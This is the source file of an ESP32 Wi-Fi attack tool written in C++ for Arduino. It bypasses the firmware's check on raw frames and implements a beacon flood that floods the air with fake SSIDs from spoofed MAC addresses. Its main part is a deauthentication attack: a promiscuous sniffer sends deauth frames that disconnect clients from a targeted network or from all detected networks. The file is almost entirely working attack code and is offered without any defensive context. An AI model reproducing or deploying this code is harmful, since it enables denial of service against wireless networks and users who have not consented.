#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

#include "WiFi.h"
extern "C" {
#include "esp_wifi.h"
  esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
}

void beaconFlood() {
  // Source code from https://github.com/Tnze/esp32_beaconSpam
  // Implementation with https://github.com/74lg0
  // ===== Settings ===== //
  const uint8_t channels[] = {1, 6, 11}; // used Wi-Fi channels (available: 1-14)
  const bool wpa2 = true; // WPA2 networks
  const bool appendSpaces = true; // makes all SSIDs 32 characters long to improve performance

  // SSID list
  const char* ssids[] = {
    "Lain-is-here",
    "I-Am-Lain",
    "Lain-Connected",
    "Lain-In-The-Wired",
    "The-Lain-Effect",
    "Lain-Protocol",
    "Lain-Watching",
    "Lain-Dreams",
    "Lain-Is-Always-There",
    "Lain-Can-See-You",
    "Lain-Routers",
    "I-See-You-Lain",
    "Lain-Network",
    "I-Am-The-Lain",
    "Lain-Wired-Heart",
    "Lain-Feed-Back",
    "She-Is-Lain",
    "The-Wired-Is-Lain",
    "Lain-Feeds-You",
    "Lain-Hacking-Now",
    "I-Am-The-Lain-Network",
    "Lain-Sleep-Wait",
    "Lain-Tunnels",
    "Lain-Is-Watching-You",
    "You-Are-Lain",
    "Lain-Router-Alive",
    "Lain-Subspace",
    "Lain-Sleepy-Lain",
    "You-See-Lain",
    "Lain-Touched-You",
    "Lain-Surveillance",
    "Lain-Sleep-Mode",
    "Welcome-To-The-Wired-Lain",
    "Lain-Existance",
    "Lain-Is-Real",
    "Reality-Is-Lain",
    "Lain-Everywhere",
    "Lain-Protocol-X",
    "Lain-Node-Ready",
    "Lain-Signals",
    "Lain-Dream-State",
    "The-Wired-Lain",
    "Lain-Silent-Wired",
    "I-Am-Your-Lain",
    "Lain-Connects-You",
    "Lain-Is-The-Wired",
    "Lain-Can-Hack-You",
    "Lain-Digital-Dream"
  };
  const int ssidCount = sizeof(ssids) / sizeof(ssids[0]);

  // Beacon frame definition
  uint8_t beaconPacket[109] = {
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: managment beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
    /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source

    // Fixed parameters
    /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8, 0x03, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
    /* 34 - 35 */ 0x31, 0x00, // capabilities Tnformation

    // Tagged parameters
    // SSID parameters
    /* 36 - 37 */ 0x00, 0x20, // Tag: Set SSID length, Tag length: 32
    /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
                 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
                 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
                 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID

    // Supported Rates
    /* 70 - 71 */ 0x01, 0x08, // Tag: Supported Rates, Tag length: 8
    /* 72 */ 0x82, // 1(B)
    /* 73 */ 0x84, // 2(B)
    /* 74 */ 0x8b, // 5.5(B)
    /* 75 */ 0x96, // 11(B)
    /* 76 */ 0x24, // 18
    /* 77 */ 0x30, // 24
    /* 78 */ 0x48, // 36
    /* 79 */ 0x6c, // 54

    // Current Channel
    /* 80 - 81 */ 0x03, 0x01, // Channel set, length
    /* 82 */      0x01,       // Current Channel

    // RSN information
    /*  83 -  84 */ 0x30, 0x18,
    /*  85 -  86 */ 0x01, 0x00,
    /*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
    /*  91 -  92 */ 0x02, 0x00,
    /*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    /* 101 - 102 */ 0x01, 0x00,
    /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
    /* 107 - 108 */ 0x00, 0x00
  };

  // Static variables to maintain state between calls
  static char emptySSID[32];
  static uint8_t channelIndex = 0;
  static uint8_t macAddr[6];
  static uint8_t wifi_channel = 1;
  static uint32_t packetCounter = 0;
  static uint32_t packetRateTime = 0;
  static uint32_t packetSize = wpa2 ? sizeof(beaconPacket) : (sizeof(beaconPacket) - 26);
  static bool initialized = false;
  static int ssidIndex = 0;

  // Initialization (runs once)
  if (!initialized) {
    initialized = true;
    // Create empty SSID
    for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
    
    // Generate random MAC
    randomSeed(1);
    for (int i = 0; i < 6; i++) macAddr[i] = random(256);
    
    // WiFi setup
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);
    
    // Adjust packet for WPA
    if (!wpa2) beaconPacket[34] = 0x21;
  }

  // Main function logic (runs continuously)
  uint32_t currentTime = millis();

  // Channel hopping
  if (currentTime - packetRateTime > 100) {
    if (sizeof(channels) > 1) {
      uint8_t ch = channels[channelIndex];
      channelIndex = (channelIndex + 1) % (sizeof(channels)/sizeof(channels[0]));
      
      if (ch != wifi_channel && ch >= 1 && ch <= 14) {
        wifi_channel = ch;
        esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
      }
    }

    // Get current SSID
    const char* currentSSID = ssids[ssidIndex];
    ssidIndex = (ssidIndex + 1) % ssidCount;
    int ssidLen = strlen(currentSSID);
    
    // Update MAC (last byte changes for diversity)
    macAddr[5] = random(256);
    memcpy(&beaconPacket[10], macAddr, 6);
    memcpy(&beaconPacket[16], macAddr, 6);
    
    // Clear and set SSID
    memcpy(&beaconPacket[38], emptySSID, 32);
    memcpy(&beaconPacket[38], currentSSID, ssidLen);
    
    // Set current channel
    beaconPacket[82] = wifi_channel;
    
    // Send packet
    if (appendSpaces) {
      for (int k = 0; k < 3; k++) {
        packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, 0) == 0;
        delay(1);
      }
    } else {
      uint16_t tmpPacketSize = (109 - 32) + ssidLen;
      uint8_t* tmpPacket = new uint8_t[tmpPacketSize];
      memcpy(&tmpPacket[0], &beaconPacket[0], 37 + ssidLen);
      tmpPacket[37] = ssidLen;
      memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], 39);
      
      for (int k = 0; k < 3; k++) {
        packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, tmpPacket, tmpPacketSize, 0) == 0;
        delay(1);
      }
      delete[] tmpPacket;
    }
  }

  // Statistics
  if (currentTime - packetRateTime > 1000) {
    packetRateTime = currentTime;
    Serial.print("Packets/s: ");
    Serial.println(packetCounter);
    packetCounter = 0;
  }
}

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
    } else return;
  } else {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      memcpy(deauth_frame.access_point, mac_header->dest, 6);
      memcpy(deauth_frame.sender, mac_header->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    } else return;
  }

  DEBUG_PRINTF("Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", NUM_FRAMES_PER_DEAUTH, mac_header->src[0], mac_header->src[1], mac_header->src[2], mac_header->src[3], mac_header->src[4], mac_header->src[5]);
  BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;

  deauth_frame.reason = reason;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    DEBUG_PRINT("Starting Deauth-Attack on network: ");
    DEBUG_PRINTLN(WiFi.SSID(wifi_number));
    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
  } else {
    DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
  }

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth() {
  DEBUG_PRINTLN("Stopping Deauth-Attack..");
  esp_wifi_set_promiscuous(false);
}
